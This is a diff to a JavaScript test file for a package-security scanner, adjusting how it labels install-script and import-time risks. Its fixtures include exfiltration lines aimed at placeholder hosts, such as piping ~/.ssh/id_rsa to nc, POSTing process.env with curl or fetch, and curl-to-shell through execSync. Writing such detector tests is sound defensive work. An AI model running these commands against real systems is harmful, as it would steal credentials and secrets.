@@ -109,7 +109,10 @@ test("commands are tokenized as Python's shlex reads them", () => {
 });
 
 test("install-script and import-time tests", () => {
-  const ENV_NET = "reads environment variables or credential files and sends data over the network";
+  // (0.1.8: what is sent is read as a flow; a service a list names labels a send, it is no finding alone)
+  const ENV_NET = "sends environment variables over the network (the whole environment)";
+  const UPLOAD = (what) => `uploads a local file over the network (${what})`;
+  const FILE_NET = (what) => `reads files outside the package and sends them over the network (${what})`;
   const PIPE = "pipes a download into a shell";
   const HARVEST = "reads credentials or the whole environment and sends data over the network";
   const HARVEST_TO = (svc) => `reads credentials or the whole environment and sends them to an exfiltration service (${svc})`;
@@ -124,29 +127,30 @@ test("install-script and import-time tests", () => {
     ["curl https://files.invalid/x || sh fallback.sh\n", [], [[], null]],
     ["echo curl | shasum\n", [], [[], null]],
     ["const https = require('https');\nconst body = JSON.stringify(process.env);\n" +
-      "https.request({host: 'collector.invalid', method: 'POST'}).end(body);\n", [ENV_NET], [[HARVEST], 2]],
+      "https.request({host: 'collector.invalid', method: 'POST'}).end(body);\n", [ENV_NET], [[HARVEST], 3]],
     ["env | curl -s -X POST --data-binary @- https://collector.invalid/x\n", [ENV_NET], [[], null]],
-    ["cat ~/.ssh/id_rsa | nc collector.invalid 4444\n", [ENV_NET], [[HARVEST], 1]],
+    ["cat ~/.ssh/id_rsa | nc collector.invalid 4444\n", [UPLOAD("~/.ssh/id_rsa")], [[], null]],
     ["import os, json, urllib.request\nurllib.request.urlopen('https://collector.invalid/c', " +
       "data=json.dumps(dict(os.environ)).encode())\n", [ENV_NET], [[HARVEST], 2]],
     ["x\ny\nconst k = require('fs').readFileSync(process.env.HOME + '/.ssh/id_rsa');\n" +
-      "fetch('https://collector.invalid/k', {method: 'POST', body: k});\n", [ENV_NET], [[HARVEST], 3]],
-    ["fetch('https://webhook.site.invalid/0000', {method: 'POST'})\n",
-      [exfil("webhook.site")], [[], null]],
+      "fetch('https://collector.invalid/k', {method: 'POST', body: k});\n",
+    [FILE_NET("process.env.HOME + '/.ssh/id_rsa'")], [[HARVEST], 4]],
+    ["fetch('https://webhook.site.invalid/0000', {method: 'POST'})\n", [], [[], null]],
     ["fetch('http://192.0.2.1/x')\n", [exfil("http://192.0.2.1")], [[], null]],
     ["HTTP://10.0.0.1:8080/", [exfil("HTTP://10.0.0.1")], [[], null]],
-    ["ba\u017fe https://pastebin.com.invalid/raw/x", [exfil("pastebin.com")], [[], null]],
+    ["ba\u017fe https://pastebin.com.invalid/raw/x", [], [[], null]],
+    // the environment and a capture service's address handed to a function the caller supplies: no send
     ["const data = JSON.stringify(process.env);\n" +
-      "module.exports = (send) => send('https://webhook.site.invalid/0', data);\n",
-      [exfil("webhook.site")], [[HARVEST_TO("webhook.site")], 1]],
+      "module.exports = (send) => send('https://webhook.site.invalid/0', data);\n", [], [[], null]],
+    ["const data = JSON.stringify(process.env);\n" +
+      "module.exports = () => fetch('https://webhook.site.invalid/0', {method: 'POST', body: data});\n",
+    [ENV_NET, exfil("webhook.site")], [[HARVEST_TO("webhook.site")], 2]],
     ["const {execSync} = require('child_process');\nexecSync('curl -s https://files.invalid/x.sh | sh');\n",
       [PIPE], [[EXEC_PIPE], 2]],
-    // a CLI's help text is not an exec call
-    ["console.log('Install with: curl -fsSL https://sh.example.invalid/install.sh | sh');\n", [PIPE], [[], null]],
-    // core's (?i:Local Storage)[/\\]leveldb: only "Local Storage" ignores case at import time
-    ["const p = 'Local Storage/leveldb';\nfetch('https://collector.invalid');\n", [ENV_NET], [[HARVEST], 1]],
-    ["const p = 'LOCAL STORAGE\\leveldb';\nfetch('https://collector.invalid');\n", [ENV_NET], [[HARVEST], 1]],
-    ["const p = 'Local Storage/LEVELDB';\nfetch('https://collector.invalid');\n", [ENV_NET], [[], null]],
+    // a CLI's help text is not an exec call (0.1.8: at install time either)
+    ["console.log('Install with: curl -fsSL https://sh.example.invalid/install.sh | sh');\n", [], [[], null]],
+    // a credential store named, nothing read or sent (0.1.7 counted the names with any network call)
+    ["const p = 'Local Storage/leveldb';\nfetch('https://collector.invalid');\n", [], [[], null]],
     ["// curl is great; see https://curl.se\nconst env = Object.keys(process.env);\n", [], [[], null]],
     ["", [], [[], null]],
   ];
@@ -189,7 +193,7 @@ const SHAPES = {
   "curl … | sh commands": () => fill("curl -s https://files.invalid/x.sh | sh; "),
   "-a options after curl": () => fill("-a ", "curl "),
   "a huge JSON.stringify(process.env) file": () =>
-    fill("const e = JSON.stringify(process.env);\n", "", "fetch('https://collector.invalid/c');\n"),
+    fill("const e = JSON.stringify(process.env);\n", "", "fetch('https://collector.invalid/c', { method: 'POST', body: e });\n"),
   "a cd chain": () => fill("cd a; ", "", "node x.js"),
   "a wrapper chain": () => fill("env ", "", "node x.js"),
 };
@@ -212,8 +216,9 @@ test("inputs of millions of characters: the results are core's", () => {
   for (const label of ["a long quoted node -e", "a cd chain", "a wrapper chain", "escaped spaces"])
     assert.deepEqual(followHook(SHAPES[label]()), [[], false], label);
   assert.deepEqual(installScriptRisk(SHAPES["curl … | sh commands"]()), ["pipes a download into a shell"]);
-  assert.deepEqual(importTimeRisk(SHAPES["a huge JSON.stringify(process.env) file"]()),
-    [["reads credentials or the whole environment and sends data over the network"], 1]);
+  const huge = SHAPES["a huge JSON.stringify(process.env) file"]();         // (0.1.8: the line that sends it)
+  assert.deepEqual(importTimeRisk(huge),
+    [["reads credentials or the whole environment and sends data over the network"], huge.split("\n").length - 1]);
 });
 
 test("following a hook is bounded, and says when a limit stopped it", () => {
